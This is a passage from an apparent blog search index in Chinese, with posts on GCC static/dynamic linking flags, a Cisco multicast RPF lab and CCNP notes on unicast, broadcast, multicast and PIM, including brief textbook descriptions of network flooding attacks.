-L/usr/local/arm/3.3.","text":"如何同时同时使用动态和静态库链接，在GCC指令参数中具体参数如下： －Wl,-Bstatic -L/usr/local/sqlite-arm-linux/.libs -lsqlite -Wl,-Bdynamic -L/usr/local/arm/3.3.2/lib 具体用途解释：sqlite库静态连接，其它库动态连接。 －Wl,-Bstatic 与-Wl,-Bdynamic参数，从字面意义上可以理解，有静态和动态的意思，但是具体的真正规则在查找了GCC的原版手册上有说明。 原文： Note - if the linker is being invoked indirectly, via a compiler driver (eg gcc) then all the linker command line options should be prefixed by -Wl, (or whatever is appropriate for the particular compiler driver) like this: ? 1gcc -Wl,–startgroup foo.o bar.o -Wl,–endgroup This is important, because otherwise the compiler driver program may silently drop the linker options, resulting in a bad link. 实际上主要针对隐式应用LINKER的参数，用“-Wl，“来标识，,”–startgroup foo.o bar.o -Wl,–endgroup”表示一组，,-Bstatic -Bdynamic 作为关键字与－WL,不可分，在GCC连接库时，默认链接是动态链接，现在用上面的指令限制在链接sqlite库时采用静态链接。 -Bstatic 还有三个写法： -dn和-non_shared 和-static -Bdynamic 还有两个写法：-dy 和-call_shared 上面参数“-L/usr/local/sqlite-arm-linux/.libs “放不放在-Wl,…之间无所谓，因为它只是提供了sqlite动静态库的位置。可以改成下面的参数形式，更直观。 ? 1-L/usr/local/sqlite-arm-linux/.libs -L/usr/local/arm/3.3.2/lib -Wl,-dn -lsqlite -Wl,-dy －Wl,-dn 和 -Wl,-dy成对出现才能起到标题所说的作用。 关于-Wl,后面的参数还有很多，全部明白我也不能。 还有一个问题值得注意，在-Wl,后面不能有空格，否则会出错！ 关于-Wl,option 说明还有一段说明 GCC命令参数的英文原文 -Wl,option Pass option as an option to the linker. If option contains commas, it is split into multiple options at the commas. 传递参数option作为linker的一个参数，如果option包含逗号，将在逗号处分割成几个参数。 例如： -Wl,-dn –lsqlite －dn 开始静态链接 －lsqlite 静态链接sqlite库 静态链接完后，然后需要动态链接 -Wl,-dy 重新开始动态链接。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"CISCO组播RPF逆向路径转发实验原理","slug":"EMBEDDED/CISCO组播RPF逆向路径转发实验原理","date":"2016-05-10T07:46:41.000Z","updated":"2017-07-10T08:45:52.003Z","comments":true,"path":"EMBEDDED/CISCO组播RPF逆向路径转发实验原理.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/CISCO组播RPF逆向路径转发实验原理.html","excerpt":"RPF,reverse path forwarding. 是组播转发的一个重要基础。只有当RPF检测成功以后，组播流量才能正确的在网络中进行转发。 当在baidu或者google里面查询关键字 “CISCO RPF检测机制和工作原理”,我们会轻易得","text":"RPF,reverse path forwarding. 是组播转发的一个重要基础。只有当RPF检测成功以后，组播流量才能正确的在网络中进行转发。 当在baidu或者google里面查询关键字 “CISCO RPF检测机制和工作原理”,我们会轻易得到下面的原理： www.2cto.com RPF检查的原理：路由器在单播路由表中查找源地址以确定数据包到达的接口是否位于返回信源的的反向路径上，如果是则RPF检查成功，如果不是则标记”RPF失败丢弃”并丢弃数据包。简单来说就是根据去的数据路由表项来检查回来的包，确定去回在一线上。 作用：对于多播，能防止环路（多播RPF检查是默认开启且不能关闭的）；对于单播，能防止IP欺骗攻击（需要手工配置RPF检查） 就这么简单的一句话，其实我看了很多次都没有真正理解其中的意义在于哪里。cisco也有一个专门的ppt来讲解这个问题，但是最后我还是很模糊。不知所云，但是我记住了一个概念，组播流量来的方向或者接口，在本台路由器上面show ip route x.x.x.x回去的单播路由表必须也要一致，否则的话就是RPF失败，然后把组播流量丢弃。 今天从同事那里找了一个实验，做完以后，我发现RPF也不是那么神秘，下面就是实验过程，我们可以一起来验证一下是不是上面我理解的： 在该拓扑图中，R1-R4分别按照拓扑图中的标示，配置接口IP地址，并且在每一台路由器上面使能ip multicast-routing,然后在每个接口下面配置ip pim sparse-mode. R2的F0/0作为rp 候选和bsr 候选。 www.2cto.com 这个时候，整个网络的单播和组播部分就已经齐活了。 组播的配置很简单，就几条命令，该拓扑图的配置如果有疑问可以参考附件，这里就不用多的篇幅去说如何配置组播了。 这个时候，在R4上面起一个loopback接口作为模拟连接组播客户端（接收方）的接口，在接口下面使能命令ip igmp join 224.1.1.1. 然后R4的loopback0接口就会向RP发送(*,G)的join报文进行加入. 然后再从R1路由器上面ping 224.1.1.1,来模拟R1作为组播源在发送224.1.1.1的组播数据。 这里可以看到。R1去ping224.1.1.1是通的，因为R1是组播源，会发送(S,G)注册到RP,然后R4是组播客户端，会发(*,G)到rp,然后rp把S回应给R4,最后建立SPT（最短路径树)，R4从R1那里获得组播流量。 好了，重点在于RPF是如何工作的。前面看了网上查的原理。这里用实验来证明。 在拓扑图中，从R1到R4其实是又两条工作路径的。 R2和R3之间，以太口相互连接，串口也相互连接。 整网启用ospf，这个时候根据ospf最短路径优先，肯定是走的cost小的，所以从R4到R1，走的都是以太接口。 实验这里就开始了，假如在R3的f1/0接口下面，no ip pim sparse-mode,那么组播流量会从棕色的路径发送给R3,但是在R3上面回去的路由是红色的线路，这个时候RPF检测就失败了，因为接收组播流量的接口和回去的单播路由的接口不是同一个接口。 在R3上面，我们可以看到： www.2cto.com 本来以前在R3上面没有再接口f1/0删除命令ip pim sparse-mode之前： R3#show ip rpf 1.1.1.1 RPF information for ? (1.1.1.1) RPF interface: FastEthernet1/0 RPF neighbor: ? (3.1.1.1) RPF route/mask: 1.1.1.0/24 RPF type: unicast (ospf 1) RPF recursion count: 0 Doing distance-preferred lookups across tables 当删除以后，再去看看rpf的检测： R3#show ip rpf 1.1.1.1 RPF information for ? (1.1.1.1) failed, no route exists 原因在于，因为R3在f1/0移除了pim协议，所以和对端f1/0建立不起来邻居，自然组播流量不会经过以太口进行转发，R3只有从s2/0收到组播流量，但是，在R3上面的路由表由于是ospf会选择最短的路径，所以回去的时候走的是以太口，路径不匹配，丢包… R3#show ip route 1.1.1.1 www.2cto.com Routing entry for 1.1.1.0/24 Known via “ospf 1”, distance 110, metric 2, type intra area Last update from 3.1.1.1 on FastEthernet1/0, 00:04:10 ago Routing Descriptor Blocks: * 3.1.1.1, from 3.1.1.1, 00:04:10 ago, via FastEthernet1/0 Route metric is 2, traffic share count is 1 在RPF的源检测标准中，只能有一个输入接口，选举方法如下： lower AD&amp;gt;longest match&amp;gt;lower metric&amp;gt;higher ip 作者 hny2000","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"CCNP路由实验之十 组播（多播）","slug":"EMBEDDED/CCNP路由实验之十 组播（多播）","date":"2016-05-10T06:24:57.000Z","updated":"2017-07-10T08:45:39.653Z","comments":true,"path":"EMBEDDED/CCNP路由实验之十 组播（多播）.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/CCNP路由实验之十 组播（多播）.html","excerpt":"CCNP路由实验之十 组播（多播） 单播（Unicast）：网络节点之间的通信通讯的模式是”一对一”的，此时信息的接收和传递只在两个节点之间进行。例如，你在收发电子邮件、浏览网页时，必须与邮件服务器、Web服务器建立连接，此时使用的就是单播数据传输方","text":"CCNP路由实验之十 组播（多播） 单播（Unicast）：网络节点之间的通信通讯的模式是”一对一”的，此时信息的接收和传递只在两个节点之间进行。例如，你在收发电子邮件、浏览网页时，必须与邮件服务器、Web服务器建立连接，此时使用的就是单播数据传输方式。网络中的交换机和路由器对数据只进行转发不进行复制。如果10个客户机需要相同的数据，则服务器需要逐一传送，重复10次相同的工作。但由于其能够针对每个客户的及时响应，所以现在的网页浏览全部都是采用IP单播协议。网络中的路由器和交换机根据其目标地址选择传输路径，将IP单播数据传送到其指定的目的地。单播应用于TCP，而TCP是一个面向连接的协议，它意味着分别运行于两主机（由IP地址确定）内的两进程（由端口号确定）间存在一条连接。考虑包含多个主机的共享信道网络如以太网。每个以太网帧包含源主机和目的主机的以太网地址（48 bit）。通常每个以太网帧仅发往单个目的主机，目的地址指明单个接收接口，因而称为单播(unicast)。在这种方式下，任意两个主机的通信不会干扰网内其他主机（可能引起争夺共享信道的情况除外） 单播的优点： 1）服务器及时响应客户机的请求 &lt;/span&gt;&lt;/span&gt; 2）服务器针对每个客户不同的请求发送不同的数据，容易实现个性化服务。 单播的缺点： 1）服务器针对每个客户机发送数据流，在客户数量大、每个客户机流量大的流媒体应用中服务器不堪重负。 &lt;/span&gt;&lt;/span&gt; 2）大量佔用网络带宽 广播（Broadcast）：主机之间”一对所有”的通讯模式（UDP），网络对其中每一台主机发出的信号都进行无条件复制并转发，所有主机都可以接收到所有信息（不管你是否需要），如客户机通过DHCP自动获得IP地址的过程就是通过广播来实现的，由于其不用路径选择，所以其网络成本可以很低廉。有线电视网就是典型的广播型网络，我们的电视机实际上是接受到所有频道的信号，但只将一个频道的信号还原成画面。在数据网络中也允许广播的存在，但是同单播和多播相比，广播几乎占用了子网内网络的所有带宽，因此其被限制在二层交换机的局域网范围内，禁止广播数据穿过路由器，防止广播数据（广播风暴）影响大面积的主机。集线器由于其工作原理决定了不可能过滤广播风暴，一般的交换机也没有这一功能，不过现在有的网络交换机（如全向的QS系列交换机）也有过滤广播风暴功能了，路由器本身就有隔离广播风暴的作用。 广播风暴不能完全杜绝，但是只能在同一子网内传播，就好像喇叭的声音只能在同一会场内传播一样，因此在由几百台甚至上千台电脑构成的大中型局域网中，一般进行子网划分，就像将一个大厅用墙壁隔离成许多小厅一样，以达到隔离广播风暴的目的。 在IP网络中，广播地址用IP地址“255.255.255.255”来表示，这个IP地址代表同一子网内所有的IP地址。 广播分为第2层广播和第3层广播。第2层广播也称硬件广播，用于在局域网内向所有的结点发送数据，通常不会穿过局域网的边界（路由器），除非它变成一个单播。广播是一个二进制的全1或者十六进制全F的地址。 第3层广播用于在这个网络内向所有的结点发送数据。第3层广播也支持平面的老式广播。广播信息是指以某个广播域所有主机为目的的信息。这些被称为网络广播，它们是所有的主机位均为ON。 广播的优点：1）网络设备简单，维护简单，布网成本低廉 2）由于服务器不用向每个客户机单独发送数据，所以服务器流量负载极低。 广播的缺点：1）无法针对每个客户的要求和时间及时提供个性化服务。 2）网络允许服务器提供数据的带宽有限，客户端的最大带宽＝服务总带宽。例如有线电视的客户端的线路支持100个频道（如果采用数字压缩技术，理论上可以提供500个频道），即使服务商有更大的财力配置更多的发送设备、改成光纤主干，也无法超过此极限。也就是说无法向众多客户提供更多样化、更加个性化的服务。3）广播禁止允许在Internet宽带网上传输。 泛洪，是交换机和网桥使用的一种数据流传递技术,交换机根据收到数据帧中的源MAC地址建立该地址同交换机端口的映射，并将其写 入MAC地址表（CAM表）中。交换机将数据帧中的目的MAC地址同已建立的MAC地址表进行比较，以决定由哪个端口进行转发。如数据帧中的目的MAC地址不在MAC地址表中，则向所有端口转发。泛洪操作广播的是普通数据帧而不是广播帧 (FF.FF.FF.FF.FF.FF).，广播是向同一子网内所有的端口（包括自己的那个端口）发送消息; 泛洪只是在所有的端口中不包括发送消息的（自己的）那个端口发送消息. 洪水攻击包含MAC泛洪、网络泛洪、TCP SYN泛洪、应用程序泛洪、DHCP报文泛洪攻击、ARP报文泛洪攻击 1. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-size:9pt&quot;&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;MAC&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;泛洪：生在&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;OSI&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;第二层，攻击者进入&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;LAN&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;内，将假冒源&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;MAC&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;地址和目的&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;MAC&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;地址将数据帧发送到以太网上导致交换机的内容可寻址存储器（&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;CAM&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;）满掉，然后交换机失去转发功能，导致攻击者可以像在共享式以太网上对某些帧进行嗅探，如果发生了&lt;/span&gt;&lt;span style=&quot;font-family:Times New Roman&quot;&gt;mac&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;地址泛洪攻击，那么你所处的局域网会出现网络缓慢或者断网现象，可以用&lt;/span&gt;&lt;span style=&quot;font-family:Times New Roman&quot;&gt;wireshark&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;等抓包软件抓包分析，能够发现大量的数据包，其&lt;/span&gt;&lt;span style=&quot;font-family:Times New Roman&quot;&gt;mac&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;地址均为随机伪造，且数据内容也为随机伪造。这种攻击可以通过端口安全技术方式防御，比如端口和&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt;MAC&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;地址绑定。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-family:Arial; font-size:10pt&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 2. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-size:9pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;网络泛洪&lt;/span&gt;Smurf&lt;span style=&quot;font-family:宋体&quot;&gt;：发生在&lt;/span&gt;OSI&lt;span style=&quot;font-family:宋体&quot;&gt;第三层，就是假冒&lt;/span&gt;ICMP&lt;span style=&quot;font-family:宋体&quot;&gt;广播&lt;/span&gt;ping&lt;span style=&quot;font-family:宋体&quot;&gt;，如果路由器没有关闭定向广播，那攻击者就可以在某个网络内对其它网络发送定向广播&lt;/span&gt; ping&lt;span style=&quot;font-family:宋体&quot;&gt;，那个网络中的主机越是多，造成的结果越是严重，因为每个主机默认都会响应这个&lt;/span&gt;ping&lt;span style=&quot;font-family:宋体&quot;&gt;，导致链路流量过大而拒绝服务，所以属于增幅泛洪攻击，当然也可以对本&lt;/span&gt; &lt;span style=&quot;font-family:宋体&quot;&gt;网络发送广播&lt;/span&gt;ping&lt;span style=&quot;font-family:宋体&quot;&gt;。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10pt&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 3. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-size:9pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;网络泛洪&lt;/span&gt;DDos&lt;span style=&quot;font-family:宋体&quot;&gt;：发生在&lt;/span&gt;OSI&lt;span style=&quot;font-family:宋体&quot;&gt;第三、四层，攻击侵入许多因特网上的系统，将&lt;/span&gt;DDos&lt;span style=&quot;font-family:宋体&quot;&gt;控制软件安装进去，然后这些系统再去感染其它系统，通过这些代理，攻击者将攻击指令发送给&lt;/span&gt;DDos&lt;span style=&quot;font-family:宋体&quot;&gt;控制软件，然后这个系统就去控制下面的代理系统去对某个&lt;/span&gt;IP&lt;span style=&quot;font-family:宋体&quot;&gt;地址发送大量假冒的网络流量，然后受攻击者的网络将被这些假的流量所占据就无法为他们的正常用户提供服务了。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10pt&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 4. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-size:9pt&quot;&gt;TCP SYN&lt;span style=&quot;font-family:宋体&quot;&gt;泛洪发生在&lt;/span&gt;OSI&lt;span style=&quot;font-family:宋体&quot;&gt;第四层，这种方式利用&lt;/span&gt;TCP&lt;span style=&quot;font-family:宋体&quot;&gt;协议的特性，就是三次握手。攻击者发送&lt;/span&gt;TCP SYN&lt;span style=&quot;font-family:宋体&quot;&gt;，&lt;/span&gt;SYN&lt;span style=&quot;font-family:宋体&quot;&gt;是&lt;/span&gt;TCP&lt;span style=&quot;font-family:宋体&quot;&gt;三次握手中的第一个数据包，而当服务器返回&lt;/span&gt;ACK&lt;span style=&quot;font-family:宋体&quot;&gt;后，改攻击者就不对之进行再确认，那这个&lt;/span&gt;TCP&lt;span style=&quot;font-family:宋体&quot;&gt;连接就处于挂起状态，也就是所谓的半连接状态，服务器收不到再确认的话，还会重复发送&lt;/span&gt;ACK&lt;span style=&quot;font-family:宋体&quot;&gt;给攻击者。这样更加会浪费服务器的资源。攻击者就对服务器发送非常大量的这种&lt;/span&gt;TCP&lt;span style=&quot;font-family:宋体&quot;&gt;连接，由于每一个都没法完成三次握手，所以在服务器上，这些&lt;/span&gt;TCP&lt;span style=&quot;font-family:宋体&quot;&gt;连接会因为挂起状态而消耗&lt;/span&gt;CPU&lt;span style=&quot;font-family:宋体&quot;&gt;和内存，最后服务器可能死机，就无法为正常用户提供服务了。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10pt&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 5. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-size:9pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;应用程序泛洪发生在&lt;/span&gt;OSI&lt;span style=&quot;font-family:宋体&quot;&gt;第七层，目的是消耗应用程序或系统资源，比较常见的应用程序泛洪就是垃圾邮件，但一般无法产生严重的结果。其它类型的应用程序泛洪可能是在服务器上持续运行高&lt;/span&gt;CPU&lt;span style=&quot;font-family:宋体&quot;&gt;消耗的程序或者用持续不断的认证请求对服务器进行泛洪攻击，意思就是当&lt;/span&gt;TCP&lt;span style=&quot;font-family:宋体&quot;&gt;连接完成后，在服务器提示输入密码的时候停止响应。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10pt&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 6. &lt;div style=&quot;background: white&quot;&gt;[&lt;span style=&quot;color:black; font-family:宋体; font-size:9pt&quot;&gt;DHCP&lt;/span&gt;](http://baike.baidu.com/view/7992.htm)&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:宋体; font-size:9pt&quot;&gt;报文泛洪攻击是指：恶意用户利用工具伪造大量DHCP报文发送到服务器，一方面恶意耗尽了IP资源，使得合法用户无法获得IP资源;另一方面,如果[交换机](http://baike.baidu.com/view/1077.htm)上开启了DHCPSnooping功能，会将接收到的DHCP报文上送到[CPU](http://baike.baidu.com/view/2089.htm)。因此大量的DHCP[报文](http://baike.baidu.com/view/175122.htm)攻击设备会使DHCP服务器高负荷运行，甚至会导致设备瘫痪。&lt;/span&gt;&lt;span style=&quot;font-size:10pt&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 7. &lt;div style=&quot;background: white&quot;&gt;[&lt;span style=&quot;color:black; font-family:宋体; font-size:9pt&quot;&gt;ARP&lt;/span&gt;](http://baike.baidu.com/view/32698.htm)[&lt;span style=&quot;color:black; font-family:宋体; font-size:9pt&quot;&gt;报文&lt;/span&gt;](http://baike.baidu.com/view/175122.htm)&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:宋体; font-size:9pt&quot;&gt;泛洪类似DHCP泛洪，同样是恶意用户发出大量的[ARP](http://baike.baidu.com/view/32698.htm)报文，造成L3设备的ARP表项溢出，影响正常用户的转发。&lt;/span&gt;&lt;span style=&quot;font-size:10pt&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; &lt;span style=&quot;color:black; font-size:10pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;冲突域（&lt;/span&gt;&lt;span style=&quot;font-family:Times New Roman&quot;&gt;Collision Domain&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;）：一组与同一条物理介质相连的设备，其中任何两台设备同时访问该介质都将导致冲突，冲突域中同一时间内只有一台机器能够发送数据。第一层设备如集线器，与之连接的所有设备都属于同一个冲突域和同一个广播域；第二层设备如交换机和网桥，将网络划分成多个网段，每个网段是一个独立的冲突域，但是相连的所有设备是一个广播域，交换机的每个端口就是一个冲突域；&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt; &lt;/span&gt;&lt;/span&gt; &lt;span style=&quot;color:black; font-size:10pt&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;广播域（&lt;/span&gt;&lt;span style=&quot;font-family:Times New Roman&quot;&gt;Broadcast Domain&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;）：网络中一组相互接收广播消息的设备。第三层设备如路由器，将网络划分为多个冲突域和广播域。&lt;/span&gt;&lt;span style=&quot;font-family:Arial&quot;&gt; &lt;/span&gt;&lt;/span&gt; 以太网使用载波侦听多路访问/冲突检测（Carrier SenseMulti-Access/Collision Detectio 技术以减少冲突的发生。即，二层广播帧覆盖的范围就是广播域；二层单播帧覆盖的范 围就是冲突域。 多播（Multicast）：“多播“也可以称为“组播“， 主机之间一对一组的通讯模式（UDP），也就是加入了同一个组的主机可以接受到此组内的所有数据，网络中的交换机和路由器只向有需求者复制并转发其所需数据。主机可以向路由器请求加入或退出某个组，网络中的路由器和交换机有选择的复制并传输数据，即只将组内数据传输给那些加入组的主机（组播组）。这样既能一次将数据传输给多个有需要的主机，又能保证不影响其他不需要（未加入组）的主机的其他通讯。例如网上视频会议、网上视频点播特别适合采用多播方式。IP网络的多播一般通过多播IP地址来实现。多播IP地址就是D类IP地址，即224.0.0.0至239.255.255.255之间的IP地址。多播处于单播和广播之间，帧仅传送给属于多播组的多个主机。 组播组可以是永久的也可以是临时的。组播组地址中，有一部分由官方分配的，称为永久组播组。永久组播组保持不变的是它的ip地址，组中的成员构成可以发生变化。永久组播组中成员的数量都可以是任意的，甚至可以为零。那些没有保留下来供永久组播组使用的ip组播地址，可以被临时组播组利用。 224.0.0.0～224.0.0.255为预留的组播地址（永久组地址），地址224.0.0.0保留不做分配，其它地址供路由协议使用； 224.0.1.0～238.255.255.255为用户可用的组播地址（临时组地址），全网范围内有效；239.0.0.0～239.255.255.255为本地管理组播地址，仅在特定的本地范围内有效。常用的预留组播地址列表如下： 224.0.0.0基准地址（保留） 224.0.0.1 所有主机和路由器地址，广播域内 224.0.0.2所有组播路由器的地址 224.0.0.3不分配 224.0.0.4dvmrp 路由器 224.0.0.5ospf 路由器 224.0.0.6ospf dr 224.0.0.7st 路由器 224.0.0.8st 主机 224.0.0.9rip-2 路由器 224.0.0.10Eigrp 路由器 224.0.0.11活动代理 224.0.0.12dhcp 服务器/中继代理 224.0.0.13所有pim 路由器 224.0.0.14rsvp 封装 224.0.0.15所有cbt 路由器 224.0.0.16指定sbm 224.0.0.17所有sbms 224.0.0.18vrrp 224.0.0.40cisco路由器用于发现auto-rp 多播基本原理 Multicast 应用在一点对多点、多点对多点的网络传输中，可以大大的减少网络的负载。 因此，Multicast 广泛地应用在流媒体的传输、远程教学、视频/音频会议等网络应用方面。 Multicast 采用 D 类 IP 地址，即 224.0.0.0~239.255.255.255。其中 224.0.0.0~224.0.0.255 是保留地址，239.0.0.0~239.255.255.255 是私有地址，类似于 unicast 的私有地址。 Multicast的 IP 地址与 MAC地址的映射：MAC 地址有 48 位，前面 24 位规定为 01-00-5E， 接着一位为 0，后面 23 位是 IP 地址的后 23 位。 路由器间要通过组播协议（如 DVMRP、MOSPF、PIM）来建立组播树和转发组播数据 包。组播树有两类：源树和共享树。 多播时，路由器采用组管理协议 IGMP 来管理和维护主机参与组播。IGMP 协议 v1 中， 主机发送 report 包来加入组；路由器发送query 包来查询主机（地址是 224.0.0.1），同一个 组的同一个子网的主机只有一台主机成员响应，其它主机成员抑制响应。一般路由器要发送 3 次 query包，如果 3 次都没响应，才认为组超时（约 3 分钟）。IGMPv2 中，主机可以发送 1 leave 信息给路由器（地址 224.0.0.2）；路由器收到信息后，发送一个特别的 query 包，在 3 秒内没收到组成员响应，就认为组超时。 由于组播的 MAC 不是具体某台主机的 MAC，根据交换机的工作原理，交换机会对组播数据包进行广播。因此，对某些不参加组播的主机而言，这些都是不必要的流。为了解决这个问题，cisco 公司开发了 CGMP 协议。该协议用于管理参与组播的主机。每当有主机加入或离开某个组时，路由器就会把该主机的多播 IP 地址（转换成组播 MAC 地址）、主机的 MAC 地址以及消息类型（加入或离开）以 CGMP 消息告知交换机。交换机根据这些信息就 可以建立起组播转发表。 Cisco 的路由器只支持 PIM 组播协议。PIM 是一种可利用多种单播路由表（如 EIGRP、 OSPF、BGP 和静态路由等）的组播路由协议，它根据这些路由表实现组播数据的转发。尽 管它是组播路由协议，然而它实际上只是使用单播路由表来完成 RPF 检验功能，并没有重 新建立组播路由表。不像其他的路由协议，PIM 并不会在路由之间收发路由更新信息。 PIM分为Dense-mode（PIM-DM）与Sparse-mode（PIM-SM）两种。 密集模式的PIM（PIM-DM）使用”推”的方 式，把组播流向网络的各个地方转发，从而把流”推”给不同接收者。这种方式适用于网络 中的各个子网都有接收者（即接收者密集）的情况。PIM-DM一开始向网络中的各处发组播流，路由器每隔3分钟检查一次自己是否还存在”下游”的邻居，如果没有（即它无需转发组播流），就把这个流”剪”掉（即不再转发）。路由器会积累数据流所带有的源和组的信 息，使得”下游”的路由器可以建立它们的组播转发表。PIM-DM只支持源树，而无法使用 共享树。 密集模式工作过程： 邻居发现：使用hello数据包发现邻居并维护邻居关系，在多点访问的网络中使用hello包选举DR，DR选举依据IP地址大少比较，大的成为DR。注意DR在PIM-SM模式下才有意义 建立SPT树：当某组播源S开始向组播组G发送数据时，首先根据单播路由表进行RPF检查，如果通过了RPF检查，则创建（S，G）表项，并同时产生（*，G）表项，然后将数据包向下游网络中的PIM-DM节点进行转发。注意在PIM-DM模式中使用（S，G）表项进行数据转发 RPF检查:用来确保组播数据流能够沿组播分发树（路径）正确的传输，同时可以避免转发路径上环路的产生。当路由器收到组播数据报文时，通过已有的单播路由信息判断此报文是否在最短返回源路径的接口上。如果不是，则丢弃该报文；如果是，则转发报文到接口或者路由器。缺省情况下，如果存在多条到达源的等价路由，设备在进行RPF检查时，针对不同的情况会有不同的选路规则： 如果这几条等价路由都是来自同一张路由表项，比如单播路由表、组播静态路由表或者MBGP路由表中的一种，则选取下一跳地址最大的路由作为RPF路由。 &lt;/span&gt;&lt;/span&gt; 如果这几条等价路由来自不同的路由表，首先会比较路由优先级，再比较掩码长度。如果上述都相同，则设备会根据一定的函数计算选取出一条路由作为RPF路由。 无论上述何种情况，根据RPF检查规则，设备只会选取一条路由作为RPF路由。但是如果配置了组播负载分担之后，当存在多条等价的最优路由时，组播数据将不会按照RPF检查规则只选一条路由作为RPF路由进行转发，而是在这多条路径上按照一定的策略进行分流转发。这样，在一定程度上优化了组播数据在网络上的传输质量。 剪枝：当没有接收者的叶节点的路由器向着组播组地址224.0.0.13发送prune消息时进行剪枝。有接收者的叶节点路由器保留SPT，保留接口为转发状态。被prune剪掉的接口处于prune状态，并保持三分钟，超出三分钟后又会变成转发状态。注意prune消息是不可靠的，不会收到回复。 当处于prune状态的路由器下游接入了接收者，此时接收者通过IGMP协议向最后一跳路由器发送report消息，最后一跳路由器马上向上一级邻居路由器发送单播的Graft消息，并且收到上一级邻居路由器的Graft ACK确认消息。这样一直发送到根，此时路由器的prune接口变为forward状态. 注意graft消息是可靠的机制，必须要收到Graft ACK，如果没有收到默认3s重发。 松散模式的PIM（PIM-SM）使用”拉”的方式，只有存在接收者的网段才会接收到数据流（即接收者把流”拉”出来）。主要用于组成员分布相对分散、范围较广、大规模网络中。松散模式默认所有主机不需要接收组播包，只向明确需要组播包的主机转发。PIM-SM模型实现转发的核心任务是构造并维护一颗单向共享树，共享树选择PIM中某一个路由器作为公用根节点，即汇聚点RP（Rendesvous Point）。组播数据通过RP沿共享树向接受者转发。引入RP进行组播转发，减少数据报文和控制报文占用的网络带宽，降低路由器的处理开销。在接收的一方，链接信息接收者的路由器向该组播组对应的RP发送组加入信息，加入消息经过一个个路由器后到达根部（即汇聚点），所经过的路径变成了此共享树的RPT分支，发送端如果想要往某组播组发送数据包，首先由第一跳路由器向RP汇聚点注册，注册消息到达RP后触发源树建立，之后组播源把数据发向RP汇聚点，当数据到达RP汇聚点后，组播数据包被复制并沿着RPT树传给接受者。复制仅仅发生在分法树的分支处，这个过程能自动重复直到数据包最终到达接收者。PIM-SM的工作过程:邻居发现，DR选举、RP发现、RPT共享树生成、组播源注册、RPT向SPT切换。 邻居发现：通过各路由器之间发送hello包实现的 DR选举：借助hello消息可以为共享网络（如以太网）选举DR，DR作为本网段中的组播信息唯一转发者。无论是和组播源链接的网络，还是和接收者链接的网络，只要网络为共享媒介则需要选举DR。接收者一方的DR发送Join加入信息到RP，组播源一方的DR向RP发送Register注册信息。Hello消息携带DR优先级选项，拥有高优先级的被选为本网段的DR。假如不支持在Hello包中携带优先级，则拥有最大IP地址的路由器被选举为DR，当DR出现故障时，接受Hello消息将会超时，邻居路由器之间触发新的DR选举。 RP发现：RP是PIM-SM域中心的核心路由器，全网的信息转发都依靠它。此时RP就是工作量最大，发负载最大的，为了缓解RP的压力，就需要自举机制来选举RP，此时需要配置自举路由器BSR（Bootstrap 